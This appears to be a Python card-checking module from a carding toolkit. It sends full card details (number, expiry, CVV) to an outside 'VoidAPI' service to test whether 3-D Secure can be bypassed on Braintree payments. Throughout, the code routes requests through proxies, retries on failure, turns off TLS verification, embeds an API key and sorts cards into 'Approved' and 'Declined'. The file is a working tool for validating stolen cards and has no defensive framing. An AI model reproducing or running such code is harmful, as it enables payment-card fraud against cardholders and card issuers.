# ============================================================
#  NVBV — Braintree Non-VBV check via VoidAPI
#  Returns Live if VBV bypass successful, Declined otherwise
# ============================================================

import requests
import time
from typing import Optional, Dict


def _gstr(src, a, b):
    try:
        return src.split(a, 1)[1].split(b, 1)[0]
    except Exception:
        return ""


LIVE_STATUSES = [
    "authenticate_successful",
    "authenticate_attempt_successful",
    "authentication_successful",
    "authentication_attempt_successful",
    "three_d_secure_passed",
    "three_d_secure_authenticated",
    "three_d_secure_attempted",
    "liability_shifted",
    "liability_shift_possible",
    "frictionless_flow",
    "challenge_not_required",
]

VOIDAPI_KEY = "VDX-SHA2X-NZ0RS-O7HAM"


def _process(cc, mm, yy, cvv, proxy_dict=None):
    ses = requests.Session()
    if proxy_dict:
        ses.proxies.update(proxy_dict)

    headers = {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
    }

    url = f"https://api.voidapi.xyz/v2/vbv??key={VOIDAPI_KEY}&card={cc}|{mm}|{yy}|{cvv}"
    r = ses.get(url, headers=headers, timeout=35, verify=False)
    text = r.text.strip()

    if "524: A timeout occurred" in text:
        return None, "API Timeout"

    status = _gstr(text, 'status":"', '"') or "Card type not support."

    if status in LIVE_STATUSES:
        return True, status
    return False, status


def check_card(cc_line, proxy_dict=None):
    start = time.time()
    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "Error | Invalid format"
        cc, mm, yy, cvv = parts

        for attempt in range(3):
            try:
                result, detail = _process(cc, mm, yy, cvv, proxy_dict)
                elapsed = f"{time.time() - start:.1f}s"
                if result is True:
                    return f"Approved | {detail} | {elapsed}"
                elif result is False:
                    return f"Declined | {detail} | {elapsed}"
                else:
                    if attempt < 2:
                        time.sleep(5)
                        continue
                    return f"Error | {detail} | {elapsed}"
            except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout, ConnectionError, OSError):
                if attempt < 2:
                    time.sleep(1)
                    continue
                return f"Declined | Gateway Timeout | {time.time() - start:.1f}s"
            except Exception as e:
                return f"Error | {str(e)[:60]} | {time.time() - start:.1f}s"
    except Exception as e:
        return f"Error | {str(e)[:60]}"


def probe_site():
    try:
        r = requests.get(f"https://api.voidapi.xyz/v2/vbv??key={VOIDAPI_KEY}&card=4111111111111111|01|30|123",
                         timeout=15, verify=False)
        if r.status_code == 200 and 'status' in r.text:
            return True, "VoidAPI responding"
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
